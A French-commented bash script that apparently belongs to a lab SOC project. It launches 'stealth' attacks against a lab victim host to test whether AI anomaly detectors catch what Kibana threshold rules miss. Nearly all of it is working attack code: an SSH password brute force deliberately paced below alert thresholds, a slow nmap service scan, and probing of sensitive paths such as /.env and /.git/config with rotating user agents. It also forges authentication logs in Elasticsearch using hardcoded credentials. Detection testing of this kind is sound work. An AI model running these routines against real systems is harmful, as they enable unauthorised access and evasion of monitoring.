#!/bin/bash
# ══════════════════════════════════════════════════════════════════
#  Script d'attaques STEALTH — détectées par IA UNIQUEMENT
#  Kibana (règles statiques >10/min) NE DÉTECTE PAS
#
#  Principe : rester SOUS le seuil Kibana (< 10 tentatives/min)
#  mais générer un comportement anormal que l'IA détecte
#
#  Machine attaquante : 192.168.122.114
#  Machine victime    : 192.168.122.37
#  Usage : bash 03_attaques_stealth_ia_only.sh
# ══════════════════════════════════════════════════════════════════

VICTIME="192.168.122.37"
VICTIME_USER="victim"          # user SSH cible
DELAY_BETWEEN=7                # secondes entre tentatives (< 10/min)
TOTAL_ATTEMPTS=28              # total sur 5 minutes = 5-6/min → sous Kibana

PURPLE='\033[0;35m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
CYAN='\033[0;36m'; RED='\033[0;31m'; NC='\033[0m'

echo -e "${PURPLE}"
echo "╔══════════════════════════════════════════════════════════╗"
echo "║   ATTAQUES STEALTH — IA détecte, Kibana ne voit RIEN     ║"
echo "║   Seuil Kibana : >10 tentatives/min                       ║"
echo "║   Notre rythme : ~5/min (SOUS le radar)                   ║"
echo "╚══════════════════════════════════════════════════════════╝"
echo -e "${NC}"

# ────────────────────────────────────────────────────────────────
# ATTAQUE STEALTH 1 : SSH Low-and-Slow (< 10 tentatives/min)
# ────────────────────────────────────────────────────────────────
echo -e "${PURPLE}[STEALTH 1]${NC} SSH Low-and-Slow brute force"
echo "  Rythme : 1 tentative toutes les ${DELAY_BETWEEN}s = ~$((60/DELAY_BETWEEN))/min"
echo "  Kibana seuil = 10/min → ${RED}AUCUNE ALERTE Kibana${NC}"
echo "  IA Ensemble → ${GREEN}DÉTECTE (comportement anormal)${NC}"
echo ""

PASSWORDS=("admin" "root" "123456" "password" "toor" "kali"
           "raspberry" "ubuntu" "debian" "test" "pass" "letmein"
           "welcome" "monkey" "dragon" "master" "qwerty" "abc123"
           "1234" "12345" "111111" "sunshine" "princess" "shadow"
           "superman" "batman" "soccer" "hockey" "baseball" "access")

count=0
for pwd in "${PASSWORDS[@]}"; do
    if [ $count -ge $TOTAL_ATTEMPTS ]; then break; fi
    # Tentative SSH avec timeout court (ne pas bloquer longtemps)
    timeout 3 ssh -o StrictHostKeyChecking=no \
                  -o ConnectTimeout=2 \
                  -o BatchMode=yes \
                  -o PasswordAuthentication=yes \
                  ${VICTIME_USER}@${VICTIME} \
                  "exit" 2>/dev/null
    count=$((count+1))
    echo -e "  [${count}/${TOTAL_ATTEMPTS}] Tentative avec: ${YELLOW}${pwd}${NC} → Échec (normal)"
    sleep $DELAY_BETWEEN
done

echo ""
echo -e "${GREEN}→ $count tentatives SSH en $((count * DELAY_BETWEEN))s"
echo -e "→ Rythme : ~$((count * 60 / (count * DELAY_BETWEEN)))/min — SOUS le seuil Kibana (10/min)"
echo -e "→ Vérifier /stealth_compare sur la plateforme — catégorie 'IA seul'${NC}"
echo ""

# ────────────────────────────────────────────────────────────────
# ATTAQUE STEALTH 2 : Scan lent et discret (slow scan)
# ────────────────────────────────────────────────────────────────
echo -e "${PURPLE}[STEALTH 2]${NC} Nmap slow scan — timing T1 (très lent)"
echo "  Kibana ne voit qu'un trafic faible → ${RED}PAS d'alerte${NC}"
echo "  IA détecte le pattern de scan → ${GREEN}Anomalie comportementale${NC}"
echo ""
nmap -T1 --scan-delay 5s -sV \
     -p 22,80,443,3306,5432,8080,8443 \
     ${VICTIME} -oN /tmp/slow_scan.txt 2>&1 | tail -3
echo ""

# ────────────────────────────────────────────────────────────────
# ATTAQUE STEALTH 3 : Connexions HTTP distribuées (faible volume)
# ────────────────────────────────────────────────────────────────
echo -e "${PURPLE}[STEALTH 3]${NC} Reconnaissance HTTP lente (user-agent rotatif)"
echo "  Requêtes espacées → ${RED}pas de flood, Kibana ne voit rien${NC}"
echo "  L'Autoencoder DL détecte le pattern anormal de navigation${NC}"
echo ""

USER_AGENTS=(
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"
  "curl/7.68.0"
  "python-requests/2.28.0"
  "Wget/1.20.3 (linux-gnu)"
)

PATHS=("/admin" "/login" "/wp-admin" "/phpmyadmin" "/.env"
       "/config.php" "/backup.sql" "/api/users" "/.git/config"
       "/server-status" "/manager/html" "/actuator" "/console")

for path in "${PATHS[@]}"; do
    ua="${USER_AGENTS[$((RANDOM % ${#USER_AGENTS[@]}))]}"
    curl -s -o /dev/null -w "  GET $path → %{http_code}\n" \
         -H "User-Agent: $ua" \
         --connect-timeout 3 \
         "http://${VICTIME}${path}" 2>/dev/null
    sleep 4
done
echo ""

# ────────────────────────────────────────────────────────────────
# ATTAQUE STEALTH 4 : SSH depuis IP différente toutes les N tentatives
# (attaque distribuée simulée — pattern multi-source)
# ────────────────────────────────────────────────────────────────
echo -e "${PURPLE}[STEALTH 4]${NC} Pattern inhabituel d'authentification (heure creuse)"
echo "  Connexions SSH à 3h du matin simulées via timestamp log"
echo "  L'Isolation Forest détecte la plage horaire anormale"
echo ""
# Injecter manuellement dans ES pour simuler (sans vraie connexion)
/home/arthur-leywin/mini-soc/venv/bin/python3 - <<'EOF'
from elasticsearch import Elasticsearch
from datetime import datetime, timezone, timedelta
import random, time

es = Elasticsearch("http://localhost:9200",
    basic_auth=("elastic","elastic_password"))

# Simuler 8 tentatives SSH à 3h du matin (heure anormale)
base_time = datetime.now(timezone.utc).replace(hour=3, minute=0, second=0)
for i in range(8):
    ts = base_time + timedelta(seconds=i*45)
    doc = {
        "@timestamp": ts.isoformat(),
        "event_type": "ssh_failed",
        "src_ip":     "10.10.10.50",
        "user":       "root",
        "message":    f"Failed password for root from 10.10.10.50 port {2200+i} ssh2",
        "log_source": "auth",
        "host":       "victim",
    }
    es.index(index="soc-logs", document=doc)
    print(f"  [log {i+1}/8] SSH tentative 10.10.10.50 à {ts.strftime('%H:%M:%S')}")
    time.sleep(0.2)

print("  → Logs injectés — IA détecte la plage horaire anormale (3h00)")
print("  → Kibana : aucune alerte (volume trop faible)")
EOF

echo ""
echo -e "${GREEN}╔══════════════════════════════════════════════════════╗"
echo "║ RÉSUMÉ STEALTH                                       ║"
echo "║  • SSH low-and-slow : ~5/min (seuil Kibana : 10/min) ║"
echo "║  • Slow scan Nmap T1 : sous le radar volumétrique    ║"
echo "║  • Reconnaissance HTTP : pattern anormal DL/IF       ║"
echo "║  • Connexions heure creuse : Isolation Forest        ║"
echo "║                                                      ║"
echo "║  → Aller sur /stealth_compare pour visualiser        ║"
echo -e "╚══════════════════════════════════════════════════════╝${NC}"
